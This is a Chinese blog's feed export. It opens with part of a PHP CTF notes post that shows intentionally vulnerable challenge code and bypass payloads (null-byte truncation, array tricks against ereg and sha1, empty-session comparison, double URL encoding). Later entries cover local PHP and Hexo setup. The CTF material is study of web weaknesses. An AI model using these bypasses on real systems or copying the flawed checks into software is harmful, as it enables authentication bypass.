number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个代码好长让我来认真看一下🧐</p><p>从最后看<code>echo $info</code>、<code>$info=$flag</code>，我们知道如果满足前面的条件，flag会被赋值给<code>$info</code>并输出。</p><p>再往上找条件</p><p>要不满足条件，即<code>is_palindrome_number($req[&quot;number&quot;])</code>为假。</p><p>前面代码有写<code>is_palindrome_number</code>函数用来判断回文数字。</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>要满足<code>$value1=$value2</code>，即<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>，$value反转后不能和原来相等。</p><blockquote><p>strrev()函数反转字符串</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>需要为假，且<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>再看看上面</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>我们要在url传入一个名为<strong>number</strong>的变量</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>这段的意思是把我们所有的输入收集到$global_var列表里，此时列表**$global_var&#x3D;[<em>$number</em>]<strong>。再进入下一步循环，将键名赋值给$key，变量的值赋值给$value，即</strong>$key&#x3D;0，$value&#x3D;$number**。</p><p>进入循环内部后，trim()函数去除变量首尾的空白字符或其他字符后需满足条件<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>，即$value为字符串并给字符串加反斜线。</p><p>判断条件如下</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>综上，要传入一个字符串，字符串不能是数字还必须是整数，不是回文数字还要是回文数字😅。</p><p>悖论！<del>烦死了不做了去暴打出题人</del></p><p>没关系我们可以绕过。</p><p><code>intval()</code>和 <code>is_numeric()</code>函数在开始判断前，会先跳过所有空白字符，但是<code>is_palindrome_number()</code>不会，可以利用这个特点，在一个回文数字之前加上一个空白字符，比如<code>\f121</code>就是<code>%0c121</code></p><p>再用%00绕过<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>最终playload</strong>：<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>这个怎么还显示代码捏</p><h3 id="05-ereg-x2F-preg-match-正则-00-截断"><a href="#05-ereg-x2F-preg-match-正则-00-截断" class="headerlink" title="05 ereg&#x2F;preg_match 正则 %00 截断"></a>05 ereg&#x2F;preg_match 正则 %00 截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="001-00截断"><a href="#001-00截断" class="headerlink" title="001 %00截断"></a>001 %00截断</h5><p>需要满足条件<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>不为false，即输入的值必须有大小写<strong>字母或者数字</strong>。</p><p>还需满足<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>，即输入值<strong>长度小于8</strong>且<strong>大于99999999</strong>。</p><p>最后要满足<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>，也就是输入中必须有***-***。但是这条和第一条相悖，不慌，姐已经见过大世面了，姐可以绕过它。</p><blockquote><p>当ereg语句遇到%00的时候就会认为是休止符，不再往后看</p></blockquote><p>可以在字符串中添加%00，在它之后加*-*，骗一下第一个判断条件。</p><p>第二个条件可以使用科学计数法，比如1e10。</p><p><strong>最终playload</strong>：<code>?password=1e10%00*-*</code></p><p>本地复现没成功，我好得很哇我好的很哇😅</p><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>本地复现不成功是打不倒我的，我擅长使用百度。</p><p>翻译了一下是“调用了未定义函数”。在php5.3以上的版本将不再支持eregi()和ereg()函数，看了一下的我的版本号是7.3。</p><p>问题也不是不可避免，只需要改一下格式，把<code>ereg()</code>改成<code>erge_match()</code>就行。</p><p><del>但我不会改</del>😣</p><h4 id="002-数组绕过-1"><a href="#002-数组绕过-1" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h4><p>冲浪冲到的另外一种方法</p><p>在true和false之外还有一个返回值是null。可以利用这一特点进行绕过。</p><p>ereg() 只能处理字符串，遇到数组会返回null，而且<code>null !== false</code>。同时，strlen()也不能处理数组，也会返回null，null的长度小于8。</p><p>因为要输入数组，数组大于整数，所以一定会返回true。</p><p><strong>最终playload</strong>：<code>?password=[]=1</code></p><h3 id="06-sha-函数比较绕过"><a href="#06-sha-函数比较绕过" class="headerlink" title="06 sha()函数比较绕过"></a>06 sha()函数比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifer终将否极泰来&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>要满足两个条件：<code>($_GET[&#39;name&#39;] ！== $_GET[&#39;password&#39;]</code>和</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>。</p><p>就是要让输入的两个变量不相等但是sha1加密后相等。</p><p>不同的字符串经过sha1加密后一定不同，但是sha1不能加密数组，会报错返回null，如果让两个变量同时返回null就会相等辣。</p><p><strong>最终playload</strong>：<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-验证绕过"><a href="#07-session-验证绕过" class="headerlink" title="07 session 验证绕过"></a>07 session 验证绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifier终将否极泰来&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>要满足条件<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()存储会话信息</p></blockquote><p>这里session中的password需要我们自己传入，如果不传就是null，同时password也传空，二者就相等啦</p><p><strong>最终playload</strong>：<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-二次编码绕过"><a href="#08-urldecode-二次编码绕过" class="headerlink" title="08 urldecode 二次编码绕过"></a>08 urldecode 二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p>需要满足两个条件：<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>为false；经过urldecode编码后满足<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>也就是说传入值不能是hackerDJ，但是传入值<strong>经过urldecode解码后</strong>要和hackerDJ相等。</p><p>所以传入时要将hackerDJ的url编码再编码一次。</p><p><strong>最终playload</strong>：<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>总觉得少了点什么原来是把这个笔记忘记喽</p><p>发上来防止自己手贱删掉🦭</p><p>把万师傅的原博放这里</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP 入门基础漏洞 | 芜风 (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在浏览器打开本地PHP文件</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>随机掉落废物Mod研究php的笔记😮</p><span id="more"></span><h2 id="01-配置PHP运行环境"><a href="#01-配置PHP运行环境" class="headerlink" title="01 配置PHP运行环境"></a>01 配置PHP运行环境</h2><p>万能的互联网教我下载Apache，PHP和MySQL。好多好麻烦。我选择直接用集成环境。</p><p><a href="https://www.xp.cn/">phpstudy官网</a></p><p>直接去官网下载，会有一个压缩包，解压以后打开第一个exe文件安装就好。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>注意：压缩包保存的路径不能有中文和空格</p><p>在安装时的自定义选项中可以修改安装包的位置，我的是默认在D盘根目录，把它改到放压缩包的文件夹里了。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>根据本人尝试，在浏览器看PHP文件只需要把Apache打开就行。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-把文件丢进网站根目录"><a href="#02-把文件丢进网站根目录" class="headerlink" title="02 把文件丢进网站根目录"></a>02 把文件丢进网站根目录</h2><p>在上述安装步骤步骤中，会生成<strong>phpstudy_pro</strong>文件夹，文件夹中又有<strong>WWW</strong>文件夹。</p><p>网站根目录就是www文件下，必须将文件放置此位置才算有效，否则无法运行php文件。</p><h2 id="03-运行PHP文件"><a href="#03-运行PHP文件" class="headerlink" title="03 运行PHP文件"></a>03 运行PHP文件</h2><p>打开浏览器，在导航栏输入<code>localhost/[文件名]</code>就可以啦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-土狗发言"><a href="#04-土狗发言" class="headerlink" title="04 土狗发言"></a>04 土狗发言</h2><p>因为有一个文件写错了，在浏览器打开的时候报错了。</p><p>它居然还可以报错！</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>太高级了</p><hr><p>集成环境yyds🥳</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo使用记录</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>遇到的一些奇怪问题和修改主题页面的经验✂️</p><span id="more"></span><h2 id="奇怪问题"><a href="#奇怪问题" class="headerlink" title="奇怪问题"></a>奇怪问题</h2><h4 id="插入图片坑"><a href="#插入图片坑" class="headerlink" title="插入图片坑"></a>插入图片坑</h4><p>在最开始写博客的时候，千挑万选找了张美图准备当封面，复制文件地址插入。<code>hexo g</code> <code>hexo s</code>本地预览一切正常，<code>hexo d</code>一条龙推上去发现图片被和谐掉了（<del>不是</del>）</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>前去万能的互联网寻找了一下答案，有的说写文章的时候要建一个同名文件夹放图片，有的说要安装插件。</p><p>我当然是选择建文件夹这个更简单的操作。</p><p>在配置文件_config.yml里找到<strong>post_asset_folder</strong>，把false改为true，再次<code>hexo new</code>就建好.md文件和文件夹了。经过本人一顿Ctrl+C和Ctrl+V的操作把原文件和图片移到新的文件，充满信心地再次<code>hexo g</code> <code>hexo d</code></p><p>还是不显示图片</p><p>好的😢<del>一定是图片它真的违禁了</del></p><p>当我再次在互联网搜索时，我发现了一个华点</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>这个markdown语法里的图片插入是<code>/</code>，但是我复制的图片路径用的是<code>\</code>！</p><p>我尝试着修改之后再次<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>就这么成功了🤨</p><h4 id="Spawn-failed坑"><a href="#Spawn-failed坑" class="headerlink" title="Spawn failed坑"></a>Spawn failed坑</h4><p>美滋滋发了一篇笔记上来，发现格式有bug，抓紧时间修改。修改之后再次丝滑一条龙上传······</p><p>没丝滑成功</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>报错喽🥳<del>我面容平和根本就没有在生气</del></p><p>翻译了一下是“请确保您有正确的访问权限”，不会搞。把目光投向万能的互联网，网上说是连接的问题。</p><p>看到一条说因为git 进行<code>push</code>或者<code>hexo d</code>的时候改变了一些.deploy_git文件下的内容，只需要重新down一下就行。</p><p>于是删除.deploy_git文件夹，再次<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>。出现了一个新的.deploy_git文件！</p><p>依旧报错🥀</p><p>又继续冲浪找解决方案，又看到一条说要在_config.yml文件里把<strong>repo</strong>地址改成git地址。我早就改过了但是我发现这个人的<strong>deploy</strong>条目比我多一个<strong>branch</strong>。</p><p>秉承着不错过任何一个细节的态度我在自己的文件里也加上了这条并认真填入master。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>保存，<code>hexo d</code>，加载成功？？？</p><p>事情怎会如此简单，我解决完问题才想起要记录一下踩坑新鲜事，于是乎再次<code>hexo d</code>想看看效果。</p><p>又报错了😮我才十八眼神还挺好使的难道刚才是眼花了吗？</p><p>换了个搜索引擎继续搜，看到一个csdn上的讨论，都让修改repo地址。我不信邪继续往下拉，看到一条标签</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>我脑海中的小灯泡突然就亮了，我回到浏览器看自己的博客，格式已经修改过来了，也就是说那次眼花是真的推上去了。</p><p>Github你不要太荒谬😅</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><h4 id="页脚版权声明"><a href="#页脚版权声明" class="headerlink" title="页脚版权声明"></a>页脚版权声明</h4><p>原本的主题页脚，姐不喜欢，这个爱心太不符合姐Bking的人设了。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>我想要有个人版权声明的页脚，经过学习掌握版权声明格式后我开始准备大改特改。</p><p>凭借我只有一点知识的脑壳告诉我这种页面要用HTML来写。奈何肚子里墨水太少，只有图纸没有工具没法盖房子<del>（就是不会写代码）</del></p><p>算了，还是求助一下万能互联网吧</p><p>搜到的全是怎么给页脚添加运行时间🥲就是没人教你怎么写版权声明。换个思路，我去抓了一个别人网页的包直接偷现成的。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>代码get！</p><p>经过我一番努力，在主题的.yml文件里找到了<strong>footer</strong>部分，非常感谢主题作者的注释写得那么详细，很轻松就找到了HTML代码区。把原来的注释掉，再加上自己copy来的代码。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>一条龙以后美美得到自己喜欢的页脚🤪</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一起来搭博客</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>利用hexo+GitHub搭建一个属于自己的博客</p><span id="more"></span><p>又名：我怎么什么都不会之踩坑记录🥀</p><p>建议在powershell执行命令，cmd有些步骤会提示权限不够</p><p>”踩坑“部分都是遇到的问题和吐槽的碎碎念，如果在过程中没有遇到问题就不用看🥰</p><h2 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h2><p>这里暂时先默认有git，因为当时搭博客的之前就有用到git了。</p><p>等我有空补上😇</p><h2 id="node-js下的Hexo安装和换源"><a href="#node-js下的Hexo安装和换源" class="headerlink" title="node.js下的Hexo安装和换源"></a>node.js下的Hexo安装和换源</h2><h4 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h4><p>首先需要给电脑安装一个node.js</p><p><a href="https://nodejs.org/en/download/">下载链接</a></p><p>我当时还没有记笔记的习惯所以node下载和配置这里没有笔记</p><p>可以看看菜鸟教程讲的很详细了</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js 安装配置 | 菜鸟教程 (runoob.com)</a></p><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>给node.js换一个淘宝镜像，不然接下来下载hexo会timeout。</p><p>直接打开power shell输入以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>时间会比较长可以下楼跑个两公里</p><h4 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h4><p>powershell输入</p><figure class="highlight 